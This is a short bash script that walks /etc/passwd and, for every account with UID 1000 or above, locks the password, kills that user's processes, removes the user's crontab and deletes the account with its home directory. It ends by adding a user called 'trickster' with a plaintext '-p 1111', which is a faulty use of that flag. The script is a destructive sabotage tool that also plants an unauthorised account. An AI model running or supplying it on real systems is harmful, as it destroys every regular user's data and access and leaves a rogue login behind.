#!/bin/bash
count=$(cat /etc/passwd | wc -l) #Fetching the number of users from /etc/passwd file
initial=1
while [ "$initial" -le "$count"  ] #Iterating each user
do
	param="$initial""p"
	userid=$(gawk -F: '{ print $3 }' /etc/passwd | sed -n "$param") # Getting User ID through filtering
	if [ "$userid" -ge 1000 ] ;  then # checking whether UserID is greater or equal to 1000
               username=$(gawk -F: '{ print $1 }' /etc/passwd | sed -n "$param") # Getting Username
		sudo passwd -l "$username" #locking the password
		sudo pkill -KILL -u "$username" # killing all the process running with the username previlage
		sudo crontab -r -u "$username" # killing all the crontab activity under the username
		sudo userdel --remove "$username" # finally deleting the account
		temp1=$(cat /etc/passwd | wc -l)
                if [ `expr "$initial" - 1` == "$temp1" ] ;  then #checking the end of the file
                        break
                fi
        else
			initial=`expr "$initial" + 1`
	fi
done
sudo useradd trickster -m -p 1111 # Adding manual user
